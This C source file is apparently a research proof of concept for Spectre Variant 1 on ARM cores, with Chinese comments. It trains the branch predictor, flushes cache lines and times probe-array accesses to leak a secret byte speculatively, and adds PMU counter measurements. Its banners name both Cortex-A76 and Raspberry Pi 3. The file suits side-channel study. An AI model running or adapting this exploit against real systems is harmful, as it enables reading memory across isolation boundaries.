#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#ifndef PMU_CORE_X925
#define PMU_CORE_X925 0
#endif

#ifndef PMU_CORE_A55
#define PMU_CORE_A55 0
#endif

#ifndef PMU_WINDOW_NAME
#define PMU_WINDOW_NAME "load-or-store-function-per-call"
#endif

#include "../pmu.h"


// 1. 计时器封装
static inline uint64_t get_time(void) {
    struct timespec t;
    clock_gettime(CLOCK_MONOTONIC, &t);
    return t.tv_sec * 1000000000ULL + t.tv_nsec;
}


static inline void flush_memory(void *addr) {
    asm volatile(
        "dc civac, %0\n\t"
        "dsb ish\n\t"
        "isb\n\t"
        :: "r"(addr) : "memory");
}

static inline void memory_barrier(void) {
    asm volatile ("dsb ish; isb" ::: "memory");
}

#define _mStore(addr, val)                 \
asm volatile(                                      \
    "strb %w[value], [%[address]]\n\t"          \
    :                                              \
    : [address] "r" (addr), [value] "r" ((uint32_t)(val)) \
    : "memory")


#ifndef ACCESS_TYPE_LOAD
#define ACCESS_TYPE_LOAD    1
#endif

#ifndef TRAIN_TIMES
#define TRAIN_TIMES         15
#endif

#ifndef ROUNDS
#define ROUNDS              1
#endif

#ifndef TRY_COUNT
#define TRY_COUNT           9999
#endif

#ifndef SECRET_VALUE
#define SECRET_VALUE        115
#endif

#ifndef SECRET_LEN
#define SECRET_LEN          1
#endif
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16}; // 16个有效元素，后面填充0
uint8_t unused2[64];
// uint8_t array2[256 * 64];
uint8_t array2[256 * 64] __attribute__((aligned(4096)));;



char ch = SECRET_VALUE;
char *secret = &ch;

uint8_t temp = 17; /* 用于防止编译器优化掉内存访问 */
static int pmu_ready;
static uint64_t pmu_call_count;


void load_or_store_function(size_t x) {
    
    if (x < array1_size) {
#if ACCESS_TYPE_LOAD
        temp = array2[array1[x] * 64];
#else
        array2[array1[x] * 64] = temp;
#endif
    }
}

void readMemoryByte(size_t out_of_boundary_x, uint8_t value[2], int score[2]) {
    int results[256]={0};
    int probe_times[256]={0};
    int tries, i, j, k, mix_i;
    unsigned int junk = 0;
    size_t training_x, x;
    register uint64_t time1, time2;
    volatile uint8_t *addr;

    for (i = 0; i < 256; i++) results[i] = 0;

    // 尝试多次以消除噪声
    for (tries = TRY_COUNT; tries > 0; tries--) {

        // 1. FLUSH array2 (准备 Reload)
        for (i = 0; i < 256; i++)
            flush_memory(&array2[i * 64]);

        // 2. 训练分支预测器 (Training)
        // 训练 loop 次数在 A53 上可能需要调整，通常 5-30 次
        // training_x = tries % array1_size;
        training_x = 0; // 始终训练合法索引，增加预测器的信心
        // for (j = 29; j >= 0; j--) {
         for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j) {

            x = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF;
            x = (x | (x >> 16));
            x = training_x ^ (x & (out_of_boundary_x ^ training_x));
        
            for (i = 0; i < 256; i++) flush_memory(&array2[i * 64]);
            flush_memory(&array1_size);

            int pmu_running = 0;
            if (pmu_ready) {
                pmu_running = (pmu_start() == 0);
                if (!pmu_running) {
                    printf("# PMU unavailable: counter group could not be started\n");
                    pmu_ready = 0;
                }
            }
            // printf("j = %d, x = %zu\n", j, x);
            load_or_store_function(x);

            asm volatile("dsb ish" ::: "memory");

            if (pmu_running) {
                pmu_stop_and_accumulate();
                pmu_call_count++;
            }
        }


        int probe_index = tries % 256;// 0-255
        addr = &array2[probe_index * 64];
        // 关键计时段
        time1 = get_time();
        junk = *addr; // 访问内存
        memory_barrier(); // 确保读完了再计时
        time2 = get_time() - time1;

            // 判定 Cache Hit
        results[probe_index] += time2;
        probe_times[probe_index] += 1;

    }
    printf("index\tlatency\tvalue\n");
    for(int i=0;i<256;i++){
        printf("%d\t%d\t%d\n", i, results[i] /= probe_times[i],array2[i*64]); // 取平均
        // printf("results[%d] = %d, array2[%d * 64] = %d\n", i, results[i] /= probe_times[i], i, array2[i*64]); // 取平均
    }
}

int main(int argc, const char * * argv) {
    // *secret = 8; // 将 secret 设置为 8 (ASCII '0')，以便我们知道正确答案应该是 8
    printf("Spectre Variant 1 PoC for Cortex-A76\n");
    printf("Reading %d bytes:\n", SECRET_LEN);
    printf("The secret value is set to %d\n", *secret);

     /* Default addresses to read is 40 (which is the length of the secret string) */
    // 初始化 array2
    for (size_t i = 0; i < sizeof(array2); i++)
        array2[i] = 1;

    pmu_ready = (pmu_setup() == 0);
    if (!pmu_ready) {
        printf("# PMU unavailable: check perf_event permissions or PMU_DEVICE\n");
    }

    // 计算 secret 相对于 array1 的偏移量
    // 假设 secret 存储在 array1 之后的某个位置
    size_t out_of_boundary_x = (size_t)(secret - (char *)array1);

    int len = SECRET_LEN;
    uint8_t value[2];
    int score[2];

    printf("Raspberry Pi 3 Spectre V1 PoC\n");
    printf("Reading %d bytes:\n", len);

    while (--len >= 0) {
        readMemoryByte(out_of_boundary_x++, value, score);
    }

    if (pmu_ready && pmu_call_count > 0) {
        pmu_print_accumulated(pmu_call_count);
    }
    pmu_cleanup();
    return (0);
}
